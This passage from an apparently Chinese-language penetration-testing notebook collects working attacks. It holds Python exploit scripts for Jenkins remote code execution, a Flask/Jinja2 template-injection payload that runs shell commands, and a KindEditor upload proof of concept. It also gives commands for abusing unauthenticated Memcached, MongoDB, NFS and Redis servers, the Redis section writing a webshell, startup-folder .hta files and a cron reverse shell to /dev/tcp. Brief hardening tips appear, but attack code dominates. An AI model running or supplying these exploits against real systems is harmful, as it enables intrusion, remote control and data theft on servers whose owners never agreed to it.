    print &#39;&#39;&#39;
  Usage:
    python exp.py &lt;url&gt; &lt;cmd&gt;
    &#39;&#39;&#39;
def _log(msg, fail=False):
    nb = &#39;[*]&#39;
    if fail:
        nb = &#39;[-]&#39;
    print &#39;%s %s&#39; % (nb, msg)
def _get(url, params=None):
    r = requests.get(url, verify=False, params=params)
    return r.status_code, r.content

def _add_bypass(url):
    return url + &#39;securityRealm/user/admin/&#39;
def check(url):
    flag, accessible = mode.ACL_PATCHED, False
    # check ANONYMOUS_READ
    status, content = _get(url)
    if status == 200 and &#39;adjuncts&#39; in content:
        flag, accessible = mode.READ_ENABLE, True
        _log(&#39;ANONYMOUS_READ enable!&#39;)
    elif status == 403:
        _log(&#39;ANONYMOUS_READ disable!&#39;)
        # check ACL bypass, CVE-2018-1000861
        status, content = _get(_add_bypass(url))
        if status == 200 and &#39;adjuncts&#39; in content:
            flag, accessible = mode.READ_BYPASS, True
    else:
        flag = mode.NOT_JENKINS
    # check entry point, CVE-2019-1003005
    if accessible:
        if flag is mode.READ_BYPASS:
            url = _add_bypass(url)
        status, content = _get(url + endpoint)
        if status == 404:
            flag = mode.ENTRY_NOTFOUND
    return flag
def exploit(url, cmd):
    payload = &#39;public class x{public x(){new String(&quot;%s&quot;.decodeHex()).execute()}}&#39; % cmd.encode(&#39;hex&#39;)
    params = {
        &#39;sandbox&#39;: True, 
        &#39;value&#39;: payload
    }
    status, content = _get(url + endpoint, params)
    if status == 200:
        _log(&#39;Exploit success!(it should be :P)&#39;)
    elif status == 405:
        _log(&#39;It seems Jenkins has patched the RCE gadget :(&#39;)
    else:
        _log(&#39;Exploit fail with HTTP status [%d]&#39; % status, fail=True)
        if &#39;stack trace&#39; in content:
            for _ in content.splitlines():
                if _.startswith(&#39;Caused:&#39;):
                    _log(_, fail=True)

if __name__ == &#39;__main__&#39;:
    if len(sys.argv) != 3:
        usage()
        exit()
    url = sys.argv[1].rstrip(&#39;/&#39;) + &#39;/&#39;
    cmd = sys.argv[2]
    flag = check(url)
    if flag is mode.ACL_PATCHED:
        _log(&#39;It seems Jenkins is up-to-date(&gt;2.137) :(&#39;, fail=True)
    elif flag is mode.NOT_JENKINS:
        _log(&#39;Is this Jenkins?&#39;, fail=True)
    elif flag is mode.READ_ENABLE:
        exploit(url, cmd)
    elif flag is mode.READ_BYPASS:
        _log(&#39;Bypass with CVE-2018-1000861!&#39;)
        exploit(_add_bypass(url), cmd)
    else:
        _log(&#39;The `checkScript` is not found, please try other entries(see refs)&#39;, fail=True)</code></pre><h2 id="Jenkins-远程代码执行漏洞（CVE-2019-1003000）"><a href="#Jenkins-远程代码执行漏洞（CVE-2019-1003000）" class="headerlink" title="Jenkins 远程代码执行漏洞（CVE-2019-1003000）"></a><span id="CVE-2019-1003000">Jenkins 远程代码执行漏洞（CVE-2019-1003000）</span></h2><ol>
<li>Declarative Plugin &lt; 1.3.4.1</li>
<li>Groovy Plugin &lt; 2.61.1</li>
<li>Script Security Plugin &lt; 1.50</li>
</ol>
<p><strong>POC 要登录账号密码，如user1:user1</strong></p>
<pre><code>python exploit.py --url http://ip:8080 --job my-pipeline --username user1 --password user1 --cmd &quot;whoami&quot;</code></pre><p><strong>exploit.py</strong></p>
<pre><code>#!/usr/bin/python

# Author: Adam Jordan
# Date: 2019-02-15
# Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
# PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)


import argparse
import jenkins
import time
from xml.etree import ElementTree

payload = &#39;&#39;&#39;
import org.buildobjects.process.ProcBuilder
@Grab(&#39;org.buildobjects:jproc:2.2.3&#39;)
class Dummy{ }
print new ProcBuilder(&quot;/bin/bash&quot;).withArgs(&quot;-c&quot;,&quot;%s&quot;).run().getOutputString()
&#39;&#39;&#39;


def run_command(url, cmd, job_name, username, password):
    print &#39;[+] connecting to jenkins...&#39;
    server = jenkins.Jenkins(url, username, password)

    print &#39;[+] crafting payload...&#39;
    ori_job_config = server.get_job_config(job_name)
    et = ElementTree.fromstring(ori_job_config)
    et.find(&#39;definition/script&#39;).text = payload % cmd
    job_config = ElementTree.tostring(et, encoding=&#39;utf8&#39;, method=&#39;xml&#39;)

    print &#39;[+] modifying job with payload...&#39;
    server.reconfig_job(job_name, job_config)
    time.sleep(3)

    print &#39;[+] putting job build to queue...&#39;
    queue_number = server.build_job(job_name)
    time.sleep(3)

    print &#39;[+] waiting for job to build...&#39;
    queue_item_info = {}
    while &#39;executable&#39; not in queue_item_info:
        queue_item_info = server.get_queue_item(queue_number)
        time.sleep(1)

    print &#39;[+] restoring job...&#39;
    server.reconfig_job(job_name, ori_job_config)
    time.sleep(3)

    print &#39;[+] fetching output...&#39;
    last_build_number = server.get_job_info(job_name)[&#39;lastBuild&#39;][&#39;number&#39;]
    console_output = server.get_build_console_output(job_name, last_build_number)

    print &#39;[+] OUTPUT:&#39;
    print console_output


if __name__ == &#39;__main__&#39;:
    parser = argparse.ArgumentParser(description=&#39;Jenkins RCE&#39;)

    parser.add_argument(&#39;--url&#39;, help=&#39;target jenkins url&#39;)
    parser.add_argument(&#39;--cmd&#39;, help=&#39;system command to be run&#39;)
    parser.add_argument(&#39;--job&#39;, help=&#39;job name&#39;)
    parser.add_argument(&#39;--username&#39;, help=&#39;username&#39;)
    parser.add_argument(&#39;--password&#39;, help=&#39;password&#39;)

    args = parser.parse_args()

    run_command(args.url, args.cmd, args.job, args.username, args.password)</code></pre><hr>
<h2 id="Flask-jinja2-SSTI-服务端模版注入攻击"><a href="#Flask-jinja2-SSTI-服务端模版注入攻击" class="headerlink" title="Flask/jinja2 SSTI 服务端模版注入攻击"></a><span id="SSTI">Flask/jinja2 SSTI 服务端模版注入攻击</span></h2><ol>
<li><p>url/?name=6，显示6，说明SSTI漏洞存在</p>
</li>
<li><p>POC：</p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}</code></pre></li>
<li><p>URL访问：<code>/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code></p>
</li>
</ol>
<p><a href="https://vulhub.org/#/environments/flask/ssti/" target="_blank" rel="noopener">https://vulhub.org/#/environments/flask/ssti/</a></p>
<hr>
<h2 id="Kindeditor-lt-4-1-11-上传漏洞（CVE-2017-1002024）"><a href="#Kindeditor-lt-4-1-11-上传漏洞（CVE-2017-1002024）" class="headerlink" title="Kindeditor &lt;=4.1.11 上传漏洞（CVE-2017-1002024）"></a><span id="CVE-2017-1002024">Kindeditor &lt;=4.1.11 上传漏洞（CVE-2017-1002024）</span></h2><ol>
<li>Kindeditor &lt;=4.1.11</li>
<li><strong>json文件地址：</strong><pre><code>/asp/upload_json.asp
/asp.net/upload_json.ashx
/jsp/upload_json.jsp
/php/upload_json.php</code></pre></li>
<li>上传路径<pre><code>kindeditor/asp/upload_json.asp?dir=file
kindeditor/asp.net/upload_json.ashx?dir=file
kindeditor/jsp/upload_json.jsp?dir=file
kindeditor/php/upload_json.php?dir=file</code></pre></li>
<li>查看版本信息<br><code>url/kindeditor//kindeditor.js</code></li>
<li>POC<pre><code>&lt;html&gt;&lt;head&gt;
&lt;title&gt;Uploader&lt;/title&gt;
&lt;script src=&quot;http://www.0-sec.org/kindeditor//kindeditor.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
KindEditor.ready(function(K) {
var uploadbutton = K.uploadbutton({
button : K(‘#uploadButton‘)[0],
fieldName : ‘imgFile‘,
url : ‘http://www.0-sec.org/kindeditor/jsp/upload_json.jsp?dir=file‘,
afterUpload : function(data) {
if (data.error === 0) {
var url = K.formatUrl(data.url, ‘absolute‘);
K(‘#url‘).val(url);}
},
});
uploadbutton.fileBox.change(function(e) {
uploadbutton.submit();
});
});
&lt;/script&gt;&lt;/head&gt;&lt;body&gt;
&lt;div&gt;
&lt;input class=&quot;ke-input-text&quot; type=&quot;text&quot; id=&quot;url&quot; value=&quot;&quot; readonly=&quot;readonly&quot; /&gt;
&lt;input type=&quot;button&quot; id=&quot;uploadButton&quot; value=&quot;Upload&quot; /&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></li>
</ol>
<hr>
<h2 id="LDAP-未授权访问"><a href="#LDAP-未授权访问" class="headerlink" title="LDAP 未授权访问"></a><span id="LDAP">LDAP 未授权访问</span></h2><ol>
<li>ldap://IP:389</li>
<li>LDAP Browser</li>
<li><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot;</code>  #-x：认证，-H：服务器地址，-D：绑定服务器的DN，-w：绑定DN的密码，-b：指定要查询的根节点</li>
<li><code>ldapsearch -x -H ldap://IP:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot; -b &quot;DC=test,DC=com&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</code> #查询所有域用户</li>
<li><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot; -b &quot;DC=test,DC=com&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot; CN | grep cn</code> #grep命令过滤</li>
<li><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot; -b &quot;DC=test,DC=com&quot; &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; CN | grep cn</code> #查询所有计算机</li>
<li><code>ldapsearch -x -H ldap://192.168.1.1:389 -D &quot;CN=testa,CN=Users,DC=test,DC=com&quot; -w DomainUser123! -b &quot;DC=test,DC=com&quot; -b &quot;DC=test,DC=com&quot; &quot;(&amp;(objectCategory=group))&quot; CN | grep cn</code> #查询所有组</li>
<li></li>
</ol>
<hr>
<h2 id="Memcached-未授权访问"><a href="#Memcached-未授权访问" class="headerlink" title="Memcached 未授权访问"></a><span id="Memcached">Memcached 未授权访问</span></h2><ol>
<li>memcached是一套分布式的高速缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，默认开放11211端口。因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于 Memcached 的安全设计缺陷客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容。</li>
<li><strong>扫描发现</strong></li>
<li><code>nmap 192.168.70.129 -p11211 --script=&quot;memcached-info.nse&quot;</code></li>
<li><code>nc -nvv IP 11211</code></li>
<li><code>telnet IP 11211</code></li>
<li><strong>一些命令：</strong></li>
<li><code>echo &quot;version&quot; | nc -vn &lt;IP&gt; 11211 #获取版本</code></li>
<li><code>echo &quot;stats&quot; | nc -vn &lt;IP&gt; 11211 #获取状态</code></li>
<li><code>echo &quot;stats slabs&quot; | nc -vn &lt;IP&gt; 11211</code></li>
<li><code>echo &quot;stats items&quot; | nc -vn &lt;IP&gt; 11211</code></li>
<li><code>echo &quot;stats cachedump &lt;number&gt; 0&quot; | nc -vn &lt;IP&gt; 11211</code></li>
<li><code>echo &quot;get &lt;item_name&gt;&quot; | nc -vn &lt;IP&gt; 11211</code></li>
</ol>
<pre><code>stats  #查看memcached 服务状态
stats items  #查看所有items
stats cachedump 32 0 #获得缓存key
get :state:264861539228401373:261588  #通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</code></pre><p><strong>其他</strong></p>
<pre><code>sudo apt-get install php-memcached
php -r &#39;$c = new Memcached(); $c-&gt;addServer(&quot;localhost&quot;, 11211); var_dump( $c-&gt;getAllKeys() );&#39;</code></pre><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
<li>设置访问控制，指定可访问的IP白名单，禁止开放到互联网。</li>
<li>修改默认端口11211为其他端口</li>
<li>最小化权限运行</li>
<li>多处备份数据</li>
</ol>
<p><a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">https://xz.aliyun.com/t/2018</a></p>
<hr>
<h2 id="MongoDB-未授权访问"><a href="#MongoDB-未授权访问" class="headerlink" title="MongoDB 未授权访问"></a><span id="MongoDB">MongoDB 未授权访问</span></h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol>
<li>MongoDB服务安装后，默认监听27017端口，默认未开启权限验证。如果服务监听在0.0.0.0，则可远程无需授权访问数据库。</li>
<li>3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。</li>
<li>3.0之前版本，如未添加用户管理员账号及数据库账号，使用<code>--auth</code>参数启动时，在本地通过127.0.0.1仍可无需账号密码登陆访问数据库，远程访问则提示需登录认证；</li>
<li>3.0及之后版本，使用<code>--auth</code>参数启动后，无账号则本地和远程均无任何数据库访问权限。</li>
</ol>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
<li>开启MongoDB服务不添加任何参数时，默认是没有权限验证的，登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危操作）而且可以远程访问数据库。</li>
</ol>
<h3 id="环境准备与未授权无密码连接"><a href="#环境准备与未授权无密码连接" class="headerlink" title="环境准备与未授权无密码连接"></a>环境准备与未授权无密码连接</h3><ol>
<li><a href="https://www.mongodb.com/download-center/community?jmp=docs" target="_blank" rel="noopener">下载MongoDB</a></li>
<li><a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/" target="_blank" rel="noopener">windows server 2008 R2 x64安装MongoDB</a></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/32.png" alt></li>
<li>使用navicat连接mongodb</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/33.png" alt></li>
<li>使用nosqlbooster连接mongodb</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/34.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/35.png" alt></li>
</ol>
<h3 id="工具连接或漏洞验证"><a href="#工具连接或漏洞验证" class="headerlink" title="工具连接或漏洞验证"></a>工具连接或漏洞验证</h3><p><strong>MSF auxiliary/scanner/mongodb/mongodb_login模块验证</strong></p>
<ol>
<li>use auxiliary/scanner/mongodb/mongodb_login</li>
<li>set rhosts IP</li>
<li>exploit</li>
</ol>
<p><strong>nmap</strong></p>
<ol>
<li>nmap -p 27017 192.168.100.3</li>
</ol>
<p><strong>工具直连数据库</strong></p>
<ol>
<li>mongo.exe 127.0.0.1 #未授权漏洞存在时，这样就可以直接连接数据库</li>
<li>mongo IP:port</li>
<li>mongo IP:port/DBname</li>
<li>mongo DBname -u username -p ‘password’</li>
<li>show dbs #默认存在local库</li>
</ol>
<h3 id="mongodb相关命令"><a href="#mongodb相关命令" class="headerlink" title="mongodb相关命令"></a>mongodb相关命令</h3><ol>
<li>help #帮助信息</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/36.png" alt></li>
<li>show dbs #列出所有数据库</li>
<li>use admin #选择数据库admin，一般存在数据库admin</li>
<li>show users #列出用户信息</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/37.png" alt></li>
<li>use dbname</li>
<li>show collections</li>
<li>db.serverStatus()</li>
<li>db.stat()</li>
<li>db.<collection>.find()</collection></li>
<li>db.<collection>.count()</collection></li>
<li>db.current.find({“username”:”admin”})</li>
</ol>
<h3 id="漏洞修复或加固"><a href="#漏洞修复或加固" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol>
<li>建议使用或升级到当前最新版本 。</li>
<li>修改默认端口（27017）为其他端口。</li>
<li>禁止mongodb服务对外开放或部署在DMZ区。</li>
<li>修改mongodb配置，指定允许访问的IP（–bind_ip选项）。</li>
<li>启用基于角色的登录认证功能，用户名为非常见用户名，密码符合复杂度要求。</li>
<li>若开启HTTP服务和REST接口，请禁用（nohttpinterface = false）。</li>
<li>开启日志审计功能。</li>
<li>使用SSL加密功能。</li>
<li>对数据进行加密存储。</li>
<li>对数据进行多地备份。</li>
</ol>
<pre><code>&gt; use admin
switched to db admin
&gt; db.createUser(
... {
... user:&quot;tttesttt&quot;,
... pwd:&quot;T35ttesttt&quot;,
... roles:[{role:&quot;userAdminAnyDatabase&quot;,db:&quot;admin&quot;}]
... }
... )</code></pre><ol start="4">
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/38.png" alt></li>
</ol>
<pre><code>#security:
security:
  authorization: enabled</code></pre><h3 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h3><ol>
<li><a href="https://blog.csdn.net/weixin_43868754/article/details/104599352" target="_blank" rel="noopener">安装MongoDB</a></li>
<li><a href="https://docs.mongodb.com/manual/reference/built-in-roles/" target="_blank" rel="noopener">mongodb内置角色</a></li>
<li><a href="https://docs.mongodb.com/manual/reference/program/mongo/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/program/mongo/</a></li>
</ol>
<hr>
<h2 id="NDMP"><a href="#NDMP" class="headerlink" title="NDMP"></a>NDMP</h2><ol>
<li>NDMP（网络数据管理协议），默认端口：10000</li>
</ol>
<p><strong>扫描发现</strong></p>
<ol>
<li>nmap -n -sV –script “ndmp-fs-info or ndmp-version” -p 10000 <IP></IP></li>
</ol>
<hr>
<h2 id="NFS-未授权访问"><a href="#NFS-未授权访问" class="headerlink" title="NFS 未授权访问"></a><span id="NFS">NFS 未授权访问</span></h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol>
<li>NFS（Network File System）即网络文件系统，默认监听端口2049，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。若运维人员未对文件访问进行控制，将导致本地文件可被任意读取。</li>
</ol>
<h3 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
<li>本地文件可被任意读取或写入文件。</li>
</ol>
<h3 id="服务检测"><a href="#服务检测" class="headerlink" title="服务检测"></a>服务检测</h3><ul>
<li>nmap -Pn -p2049 IP #</li>
<li>rpcinfo -p IP #</li>
</ul>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ol>
<li>showmount -e IP #列出导出目录及允许访问的IP范围</li>
<li>mount -t nfs IP:/[dir] /tmp/ #将IP上开放的目录挂载到本地/tmp/目录下</li>
<li>umount /tmp/ #卸载本地的共享目录</li>
</ol>
<p><strong>使用MFS模块</strong></p>
<ol>
<li>auxiliary/scanner/nfs/nfsmount</li>
</ol>
<h3 id="漏洞修复或加固-1"><a href="#漏洞修复或加固-1" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol>
<li>修改默认端口（111,2049）为其他端口</li>
<li>指定IP范围允许访问NFS服务</li>
<li>使用 anonuid，anongid 配置共享目录，让挂载到 NFS 服务器的客户机仅具有最小权限。</li>
<li>配置 nosuid 和 noexec，使用 nosuid 选项禁止 set-UID 程序在 NFS 服务器上运行，使用 noexec 禁止直接执行其中的二进制文件。</li>
</ol>
<p><a href="https://www.cnblogs.com/lgf01010/articles/9610411.html" target="_blank" rel="noopener">NFS服务全攻略</a></p>
<hr>
<h2 id="office-宏攻击"><a href="#office-宏攻击" class="headerlink" title="office 宏攻击"></a><span id="office宏攻击">office 宏攻击</span></h2><ol>
<li><a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882/</a></li>
<li><a href="https://www.cnblogs.com/Oran9e/p/7880832.html" target="_blank" rel="noopener">https://www.cnblogs.com/Oran9e/p/7880832.html</a></li>
<li>影响版本：</li>
<li>office 2003</li>
<li>office 2007</li>
<li>office 2010</li>
<li>office 2013</li>
<li>office 2016</li>
</ol>
<hr>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><ol>
<li>管理端口：15672</li>
<li>默认口令：guest:guest</li>
<li><a href="http://localhost:15672/api/connections" target="_blank" rel="noopener">http://localhost:15672/api/connections</a></li>
</ol>
<hr>
<h2 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a><span id="Redis">Redis 未授权访问</span></h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
<li>默认情况下，redis会绑定0.0.0.0:6379。</li>
<li>如果没有安全设置相关权限，如无密码可登录，访问ip无限制，用户弱密码等等，redis就有易被入侵的隐患。</li>
<li>攻击者可利用未授权漏洞访问redis，读取数据，利用config命令进行写操作，写入可利用文件，导致被完全控制等等。</li>
</ol>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ol>
<li>Centos 7</li>
<li><a href="https://redis.io/download" target="_blank" rel="noopener">redis官网下载</a></li>
<li><a href="https://code.google.com/archive/p/redis/downloads" target="_blank" rel="noopener">redis历史版本下载</a></li>
<li>安装：wget <a href="http://download.redis.io/releases/redis-5.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-5.0.8.tar.gz</a></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/1.png" alt></li>
<li>解压压缩包：tar zxvf redis-5.0.8.tar.gz </li>
<li>进入目录：cd redis-5.0.8</li>
<li>编译：make</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/2.png" alt></li>
<li>cd src/</li>
<li>启动redis server：./redis-server</li>
<li>使用redis.conf文件中的配置启动redis server：./redis-server ../redis.conf</li>
</ol>
<h3 id="终端运行客户端"><a href="#终端运行客户端" class="headerlink" title="终端运行客户端"></a>终端运行客户端</h3><ol>
<li>启动redis cli：<code>./redis-cli</code></li>
<li>获取所有配置项</li>
<li><code>127.0.0.1:6379&gt; config get *</code></li>
<li>编辑配置</li>
<li><code>127.0.0.1:6379&gt; config set [key] [value]</code></li>
<li>查看是否设置密码</li>
<li><code>127.0.0.1:6379&gt; config get requirepass</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/6.png" alt></li>
<li>设置密码</li>
<li><code>127.0.0.1:6379&gt; config set requirepass [password]</code></li>
<li>还可以修改redis.conf文件</li>
<li>修改# <code>requirepass foobared 为 requirepass [password]</code></li>
</ol>
<h3 id="图形化windows-redis客户端"><a href="#图形化windows-redis客户端" class="headerlink" title="图形化windows redis客户端"></a>图形化windows redis客户端</h3><ol>
<li><a href="https://github.com/caoxinyu/RedisClient/releases" target="_blank" rel="noopener">图形化redis客户端</a></li>
<li>下载jar版：<a href="https://github.com/caoxinyu/RedisClient/blob/windows/release/redisclient-win32.x86_64.2.0.jar?raw=true" target="_blank" rel="noopener">redisclient-win32.x86_64.2.0.jar</a></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/3.png" alt></li>
<li>登录</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/4.png" alt></li>
<li>登录不了</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/5.png" alt></li>
<li>修改redis.conf</li>
<li><code>bind 127.0.0.1</code>前加上#</li>
<li>重启redis</li>
<li><code>./redis-cli -h 127.0.0.1 -p 6379 shutdown</code> #（源码安装的重启方式）</li>
<li>再启动登录</li>
<li><code>./redis-server ../redis.conf</code></li>
<li>继续报错</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/7.png" alt></li>
<li>原因是保护模式禁止无密码登录，修改配置或修改配置文件</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/8.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/9.png" alt></li>
<li>版本太低。。。</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/10.png" alt></li>
<li>下载exe版：<a href="https://raw.githubusercontent.com/caoxinyu/RedisClient/windows/release/redisclient-win32.x86.2.0.exe" target="_blank" rel="noopener">redisclient-win32.x86.2.0.exe</a></li>
<li>无密码登录成功</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/11.png" alt></li>
</ol>
<h3 id="redis服务器原网站"><a href="#redis服务器原网站" class="headerlink" title="redis服务器原网站"></a>redis服务器原网站</h3><ol>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/13.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/14.png" alt></li>
</ol>
<h3 id="未授权测试——写入文件到网站"><a href="#未授权测试——写入文件到网站" class="headerlink" title="未授权测试——写入文件到网站"></a>未授权测试——写入文件到网站</h3><ol>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/12.png" alt></li>
<li><code>config set dir /var/www/html</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/15.png" alt></li>
<li><code>config set dbfilename shell.php</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/16.png" alt></li>
<li><code>set webshell &quot;&lt;?php phpinfo()?&gt;&quot;</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/17.png" alt></li>
<li><code>save</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/18.png" alt></li>
<li>成功写入，访问验证</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/19.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/20.png" alt></li>
</ol>
<h3 id="写入文件到windows开机启动目录"><a href="#写入文件到windows开机启动目录" class="headerlink" title="写入文件到windows开机启动目录"></a>写入文件到windows开机启动目录</h3><p>弹calc.exe</p>
<ol>
<li>路径文件：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.hta</code></li>
<li>文件代码：<code>&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;);&lt;/SCRIPT&gt;</code></li>
</ol>
<p>反弹shell（例子，使用nmap的ncat）</p>
<ol>
<li>路径文件：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ncat.hta</code></li>
<li>文件代码：<code>&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;ncat IP port -e cmd.exe&quot;);&lt;/SCRIPT&gt;</code></li>
</ol>
<h3 id="未授权测试——反弹shell"><a href="#未授权测试——反弹shell" class="headerlink" title="未授权测试——反弹shell"></a>未授权测试——反弹shell</h3><ol>
<li>启动端口监听</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/22.png" alt></li>
<li><code>config set dir /var/spool/cron/</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/21.png" alt></li>
<li><code>set test &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.1/8888 0&gt;&amp;1\n&quot;</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/23.png" alt></li>
<li><code>config set dbfilename root</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/24.png" alt></li>
<li><code>save</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/25.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/26.png" alt></li>
<li>成功反弹shell</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/27.png" alt></li>
</ol>
<h3 id="nmap扫描redis"><a href="#nmap扫描redis" class="headerlink" title="nmap扫描redis"></a>nmap扫描redis</h3><ol>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/28.png" alt></li>
</ol>
<h3 id="redis写入公钥免密登录"><a href="#redis写入公钥免密登录" class="headerlink" title="redis写入公钥免密登录"></a>redis写入公钥免密登录</h3><ol>
